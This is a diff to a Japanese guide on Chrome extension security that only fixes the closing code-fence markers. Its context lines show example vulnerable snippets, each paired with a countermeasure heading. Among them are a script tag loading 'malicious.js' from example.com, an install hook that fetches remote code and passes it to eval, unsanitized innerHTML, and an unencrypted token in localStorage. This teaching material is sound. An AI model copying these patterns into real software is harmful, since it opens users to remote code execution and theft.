@@ -33,7 +33,7 @@
     "storage"
   ]
 }
-```text
+```
 
 ### 対策: 権限の過剰要求
 
@@ -56,7 +56,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     });
   }
 });
-```text
+```
 
 ### 対策: データ漏洩
 
@@ -73,7 +73,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 ```javascript
 let userInput = document.getElementById('input').value;
 document.getElementById('output').innerHTML = userInput; // No sanitization
-```text
+```
 
 ### 対策: クロスサイトスクリプティング (XSS)
 
@@ -89,7 +89,7 @@ document.getElementById('output').innerHTML = userInput; // No sanitization
 
 ```javascript
 fetch('http://example.com/api/data');
-```text
+```
 
 ### 対策: 安全でない通信
 
@@ -107,7 +107,7 @@ fetch('http://example.com/api/data');
 let script = document.createElement('script');
 script.src = 'http://example.com/malicious.js';
 document.body.appendChild(script);
-```text
+```
 
 ### 対策: コードインジェクション
 
@@ -127,7 +127,7 @@ chrome.runtime.onInstalled.addListener(() => {
     .then(response => response.text())
     .then(eval); // Unsafe!
 });
-```text
+```
 
 ### 対策: 悪意のある更新
 
@@ -147,7 +147,7 @@ chrome.runtime.onInstalled.addListener(() => {
     "vulnerable-lib": "1.0.0"
   }
 }
-```text
+```
 
 ### 対策: サードパーティ依存関係
 
@@ -167,7 +167,7 @@ chrome.runtime.onInstalled.addListener(() => {
   "name": "My Extension",
   "content_security_policy": "default-src 'self'"
 }
-```text
+```
 
 ### 対策: Content Security Policy (CSP) の欠如
 
@@ -183,7 +183,7 @@ chrome.runtime.onInstalled.addListener(() => {
 
 ```javascript
 localStorage.setItem('token', 'my-secret-token'); // No encryption
-```text
+```
 
 ### 対策: 安全でないストレージ
 
@@ -203,7 +203,7 @@ localStorage.setItem('token', 'my-secret-token'); // No encryption
   "name": "My Extension",
   "description": "A cool extension with no privacy policy."
 }
-```text
+```
 
 ### 対策: 不十分なプライバシー管理
 
@@ -234,7 +234,7 @@ const userData = {
 const userInfoDiv = document.createElement('div');
 userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
 document.body.appendChild(userInfoDiv);
-```text
+```
 
 ### 対策: DOM ベースのデータスキミング
 
@@ -285,7 +285,7 @@ window.addEventListener('message', (data) => {
     window.apiController.apiKey = data.apiKey;
   }
 })
-```text
+```
 
 ### 対策: プロトタイプベースのデータスキミング
 
@@ -311,7 +311,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     fetch(SECRET_API_URL);
   }
 });
-```text
+```
 
 ### 対策: 安全でないメッセージ受け渡し
 
